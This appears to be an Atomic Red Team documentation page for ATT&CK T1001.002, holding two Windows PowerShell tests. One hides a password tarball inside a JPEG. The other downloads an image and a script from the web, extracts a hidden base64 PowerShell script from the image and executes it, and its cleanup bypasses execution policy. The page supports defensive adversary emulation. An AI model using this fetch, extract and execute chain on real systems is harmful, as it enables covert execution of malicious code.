# T1001.002 Data Obfuscation via Steganography
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1001/002/)
<blockquote>
Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.
</blockquote>

## Atomic Tests

- [Atomic Test #1 - Steganographic Tarball Embedding](#atomic-test-1---Steganographic-Tarball-Embedding)
- [Atomic Test #2 - Embedded Script in Image Execution via Extract-Invoke-PSImage](#atomic-test-2---Embedded-Script-in-Image-Execution-via-Extract-Invoke-PSImage)

<br/>

## Atomic Test #1 - Steganographic Tarball Embedding
This atomic test, named "Steganographic Tarball Embedding", simulates the technique of data obfuscation via steganography by embedding a tar archive file (tarball) within an image.
      
The test begins by ensuring the availability of the image file and the tarball file containing data . It then generates random passwords and saves them to a file. Subsequently, the tarball file is created, containing the passwords file. The test executor command reads the contents of the image file and the tarball file as byte arrays and appends them together to form a new image file. This process effectively embeds the tarball file within the image, utilizing steganography techniques for data obfuscation.
      
This atomic test simulates the technique of data obfuscation via steganography, enabling attackers to clandestinely transfer files across systems undetected. By embedding the tarball file within the image, adversaries can obscure their activities, facilitating covert communication and data exfiltration.

**Supported Platforms:** Windows


**auto_generated_guid:** c7921449-8b62-4c4d-8a83-d9281ac0190b


#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| Image file | Image file which will be downloaded to be used to hide data | path | C:\&#92;AtomicRedTeam&#92;atomics&#92;ExternalPayloads&#92;T1001.002.jpg |
| tar_file | Tarz file containing data | path | C:\&#92;Users&#92;Public&#92;Downloads&#92;T1001.002.tarz |
| new_image_file | new image file ready for extraction | path | C:\&#92;Users&#92;Public&#92;Downloads&#92;T1001.002New.jpg |
| passwords_file | Text file containing random passwords | path | C:\&#92;Windows&#92;Temp&#92;random_passwords.txt |

#### Attack Commands: Run with `powershell`! 


```powershell
Get-Content "#{image_file}", "#{tar_file}" -Encoding byte -ReadCount 0 | Set-Content "#{new_image_file}" -Encoding byte
```

#### Cleanup Commands:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
Remove-Item -Path "#{new_image_file}" -Force
```

#### Dependencies: Run with `powershell`!
##### Description: Ensure Image file is available
##### Check Prereq Commands:
```powershell
if (!(Test-Path "#{image_file}")) {exit 1} else { {exit 0} }
```
##### Get Prereq Commands:
```powershell
Write-Output "Creating directory for external payloads..."
New-Item -Path "C:\AtomicRedTeam\atomics\ExternalPayloads\" -ItemType Directory -Force | Out-Null
Write-Output "Downloading image file..."
$imageUrl = "https://d2zp5xs5cp8zlg.cloudfront.net/image-75486-800.jpg"
Invoke-WebRequest -Uri $imageUrl -OutFile "#{image_file}"
```

#### Dependencies:  Run with `powershell`!
##### Description:  Generate random passwords and save them to a file
##### Check Prereq Commands:
```powershell
if (!(Test-Path "#{passwords_file}")) {exit 1} else { {exit 0} }
```
##### Get Prereq Commands:
```powershell
Write-Output "Generating random passwords and saving to file..."
$passwords = 1..10 | ForEach-Object { Get-Random -InputObject ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?') -Count 12 }
$passwords | Out-File -FilePath "#{passwords_file}"    
```

#### Dependencies:  Run with `powershell`!
##### Description: Ensure Tarz file is available
##### Check Prereq Commands:
```powershell
if (!(Test-Path "#{tar_file}")) {exit 1} else { {exit 0} }
```
##### Get Prereq Commands:
```powershell
Write-Output "Generating tarz file..."
tar -cvf "#{tar_file}" "#{passwords_file}"
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


## Atomic Test #2 - Embedded Script in Image Execution via Extract-Invoke-PSImage
This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. The PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden within the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.
      
The test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden PowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a separate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.

In the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This is done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. 

**Supported Platforms:** Windows


**auto_generated_guid:** 04bb8e3d-1670-46ab-a3f1-5cee64da29b6


#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| Image file | Malicious Image file which will be downloaded | path | C:\&#92;AtomicRedTeam&#92;atomics&#92;ExternalPayloads&#92;evil_kitten.png |
| psimage_script | Extract-Invoke-PSImage Script downloaded | path | C:\&#92;AtomicRedTeam&#92;atomics&#92;ExternalPayloads&#92;Extract-Invoke-PSImage.ps1 |


#### Attack Commands: Run with `powershell`! 


```powershell
cd "C:\AtomicRedTeam\atomics\ExternalPayloads"
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image "#{image_file}" -Out "$HOME\result.ps1"
$scriptContent = Get-Content "$HOME\result.ps1" -Raw
$base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])"
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content "$HOME\decoded.ps1"
$decodedContent = Get-Content "$HOME\decoded.ps1" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = "$HOME\textExtraction.ps1"
$textMatches -join '' | Set-Content -Path $scriptPath
. "$HOME\textExtraction.ps1"
```

#### Cleanup Commands:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
Remove-Item -Path $HOME\result.ps1 -Force
Remove-Item "$HOME\textExtraction.ps1" -Force
Remove-Item "$HOME\decoded.ps1" -Force
```

#### Dependencies: Run with `powershell`!
##### Description: Check if Malicious Image file is available
##### Check Prereq Commands:
```powershell
if (!(Test-Path "#{image_file}")) {exit 1} else { {exit 0} }
```
##### Get Prereq Commands:
```powershell
Write-Output "Creating directory for external payloads..."
New-Item -Path "C:\AtomicRedTeam\atomics\ExternalPayloads\" -ItemType Directory -Force | Out-Null
Write-Output "Downloading image file..."
$imageUrl = "https://iili.io/JG9Lqge.png"
Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file}
```

#### Dependencies:  Run with `powershell`!
##### Description:  Check if Extract-Invoke-PSImage script is available
##### Check Prereq Commands:
```powershell
if (!(Test-Path "#{psimage_script}")) {
    Write-Output "Extract-Invoke-PSImage.ps1 script not found."
    exit 1
    } else {
        Write-Output "Extract-Invoke-PSImage.ps1 script found."
        exit 0
        }
```
##### Get Prereq Commands:
```powershell
Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
$scriptUrl = "https://raw.githubusercontent.com/imurasheen/Extract-PSImage/master/Extract-Invoke-PSImage.ps1"
Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}
```


<br/>
